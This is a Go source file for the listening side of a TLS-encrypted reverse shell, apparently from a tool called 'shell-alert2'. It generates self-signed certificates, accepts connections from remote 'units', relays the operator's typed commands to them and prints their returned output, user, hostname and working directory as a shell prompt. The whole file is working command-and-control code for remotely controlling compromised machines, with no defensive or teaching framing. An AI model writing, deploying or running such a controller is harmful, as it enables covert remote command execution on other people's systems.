package main

import (
	"bufio"
	"crypto/tls"
	"encoding/json"
	"fmt"
	"log"
	"net"
	"os"
	"strings"

	reverse "github.com/justin-p/shell-alert2/pkg"
)

var (
	terminator       = []byte("\000")[0] //use the 'null' byte to terminate strings
	terminatorString = string(terminator)
)

func main() {
	fmt.Printf("[*] Building ... \n")
	if len(os.Args) == 2 {
		if certFile, keyFile, err := reverse.GenCerts(); err == nil {
			cert, err := tls.LoadX509KeyPair(certFile, keyFile)
			if err != nil {
				log.Fatalf("Loadkeys : %s", err)
			}
			config := tls.Config{
				Certificates: []tls.Certificate{cert},
			}

			fmt.Printf("[*] Construction complete\n")
			host := ""
			port := os.Args[1]
			listener, err := tls.Listen("tcp", net.JoinHostPort(host, port), &config)

			if err != nil {
				log.Fatalf("[X] Cannot deploy here: %s", err)
			}
			defer listener.Close()

			for {
				unit, err := listener.Accept()
				if err != nil {
					log.Printf("[!] Unit lost: %s", err)
					break
				}
				go barracks(unit)
			}
		}
	} else {
		fmt.Printf("[X] Unable to comply:\nbarracks <port>\n")
	}
}

func barracks(unit net.Conn) {
	println("[*] Unit ready\n")
	defer unit.Close()

	stdin := os.Stdin
	reader := bufio.NewReader(stdin)
	writer := bufio.NewWriter(unit)

	go func() {
		for {
			if command, err := reader.ReadString('\n'); err == nil {
				if _, err := writer.WriteString(fmt.Sprintf("%s\n", command)); err == nil {
					writer.Flush()
				} else {
					log.Fatalf("Unit lost: %s", err)
				}
			}
		}
	}()

	connRead := bufio.NewReader(unit)
	for {
		if output, err := connRead.ReadString(terminator); err == nil {
			processOutput(output)
		}
	}
}

func processOutput(output string) {
	output = strings.Trim(output, terminatorString)
	var shell reverse.ShellOut
	if err := json.Unmarshal([]byte(output), &shell); err == nil {
		fmt.Printf("%s%s%s@%s:%s$ ", printOptional(shell.StdOut), printOptional(shell.StdErr), shell.User, shell.Hostname, shell.Dir)
	} else {
		fmt.Printf("%s", err.Error())
	}
}

func printOptional(data string) (out string) {
	data = strings.TrimSpace(data)
	if len(data) > 0 {
		out = fmt.Sprintf("%s\n", data)
	}
	return
}
